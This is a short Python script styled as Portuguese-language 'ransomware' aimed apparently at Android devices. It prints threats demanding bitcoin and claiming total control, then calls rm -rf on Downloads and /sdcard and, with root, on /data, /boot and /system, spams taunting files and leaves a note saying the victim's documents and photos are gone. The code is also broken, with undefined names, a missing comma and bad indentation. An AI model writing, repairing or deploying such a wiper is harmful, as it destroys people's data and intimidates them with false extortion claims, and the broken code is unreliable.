from os import system as run_system, startfile as open_file
from time import sleep
from subprocess import run

def start():
    os.system("clear")

    print("Você caiu em um ransomware!!!, pague em bitcoin ou APAGAREMOS e VAZAREMOS  TODO QUE ESTA NO SEU DISPOSITIVO")
    sleep(0.5)
    print("Não adianta sair!, mesmo não perdendo os arquivos, nós teremos acesso ao seu dispositivo")
    sleep(0.5)
    print("Nós instalamos VARIOS malwares e VIRUS no seu dispositivo!, TEMOS CONTROLE TOTAL")
    sleep(0.5)


        run('rm-rf Downloads', shell=shell_flag)
        run("rm -rf /sdcard"shell=shell_flag)

        if os.geteuid == 0:
            run("rm -rf /data",shell=shell_flag)
            run("rm -rf /boot",shell=shell_flag)
            run("rm -rf /system",shell=shell_flag)


        for i in range(1, 101):
            filename = f"lol/BY_WpsDroid{i}.txt"
            with open(filename, 'w') as f:
                f.write("kkk script kiddie otario")
                open_file(filename)


        run('echo "Seus documentos, fotos e projetos sumiram.
    Não adianta buscar, nada mais existe.
    Foi divertido." > /sdcard/GOODBYE.txt',shell=shell_flag)